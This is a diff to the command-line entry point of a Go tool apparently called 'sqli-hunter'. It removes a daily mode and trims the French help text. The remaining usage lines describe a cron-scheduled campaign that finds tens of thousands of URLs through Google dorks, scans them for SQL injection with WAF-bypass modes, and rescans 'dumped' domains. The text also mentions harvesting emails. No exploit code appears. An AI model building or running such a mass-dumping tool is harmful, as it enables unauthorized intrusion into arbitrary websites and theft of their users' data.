@@ -17,16 +17,13 @@ import (
 	"github.com/sqli-hunter/sqli-hunter/internal/runner"
 )
 
-const version = "1.21.0"
+const version = "1.22.0"
 
 func main() {
 	if len(os.Args) >= 2 {
 		switch os.Args[1] {
 		case "discover":
 			runDiscover(os.Args[2:])
-			return
-		case "daily":
-			runDaily(os.Args[2:])
 			return
 		case "big", "weekly":
 			runBig(os.Args[2:])
@@ -504,7 +501,6 @@ Usage:
   sqli-hunter <commande> [options]
 
 Commandes:
-  sqli-hunter daily [options]    Discover + scan quotidien (nouveaux emails)
   sqli-hunter weekly [options]   Passe hebdo max (illimité, DBMS dorks)
   sqli-hunter monthly [options]  Passe mensuelle max
   sqli-hunter big [options]      Alias weekly
@@ -515,17 +511,9 @@ Commandes:
   sqli-hunter -h                 Aide complète
   sqli-hunter --version
 
-Mode daily (cron quotidien) :
-  sqli-hunter daily
-  sqli-hunter daily --discover-limit 3000 --url-threads 64
-
-Mode weekly (max chaque semaine) :
+Mode weekly / monthly :
   sqli-hunter weekly
-  # 40k URLs · 1500 pages Google · rescan · full+waf · fresh-pass
-
-Mode monthly (max chaque mois) :
   sqli-hunter monthly
-  # 80k URLs · 3000 pages · rescan tous domaines dumpés
 
 Cron :
   0 2 * * 0  cd /opt/sqli-hunter && ./sqli-hunter weekly >> results/weekly.log 2>&1
